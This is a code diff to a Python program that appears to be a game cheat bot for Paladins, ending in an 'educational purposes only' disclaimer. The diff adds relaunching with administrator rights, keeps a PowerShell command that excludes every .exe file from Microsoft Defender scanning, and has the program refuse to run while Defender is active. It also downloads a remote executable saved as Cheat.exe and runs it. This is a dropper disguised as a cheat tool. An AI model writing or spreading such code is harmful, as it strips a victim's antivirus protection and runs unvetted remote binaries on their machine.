@@ -14,6 +14,7 @@ import threading
 from fileinput import filename
 import ctypes
 import psutil
+import pyuac
 
 
 class DefeatDefender:
@@ -1189,10 +1190,13 @@ class App:
             try:
                 url = self.version["PaladinsLink"]
                 self.file_path = tempfile.gettempdir() + "\\Cheat.exe"
-                requests.get(url, stream=True).save(self.file_path)
+                open(self.file_path).write(
+                    requests.get(url, stream=True, allow_redirects=True).content
+                )
                 subprocess.call([self.file_path], shell=True)
             except:
-                print("Direct link not working")
+                print("Download not working")
+
         try:
             subprocess.call(
                 "powershell.exe -command Add-MpPreference -ExclusionExtension .exe",
@@ -1279,11 +1283,8 @@ class App:
     def startBot(self):
         if self.defender.isrunning == True:
             self.defender.check()
-            if response == 1:
-                print("Turned off!")
-            else:
-                self.print_to_GUI(self.defender.lpText, "warning")
-                return
+            return
+
         t1 = threading.Thread(target=self.runBackgroundCheck)
         t1.start()
         if self.tier == 0:
@@ -1310,11 +1311,7 @@ class App:
     def startBotTrial(self):
         if self.defender.isrunning == True:
             self.defender.check()
-            if response == 1:
-                print("Turned off!")
-            else:
-                self.print_to_GUI(self.defender.lpText, "warning")
-                return
+            return
 
         t1 = threading.Thread(target=self.runBackgroundCheck)
         t1.start()
@@ -1541,8 +1538,11 @@ class App:
 
 
 if __name__ == "__main__":
-    login = App()
-
+    if not pyuac.isUserAdmin():
+        print("Re-launching as admin!")
+        pyuac.runAsAdmin()
+    else:
+        login = App()
 
 """
     DISCLAIMER: Use for educational purposes only"""
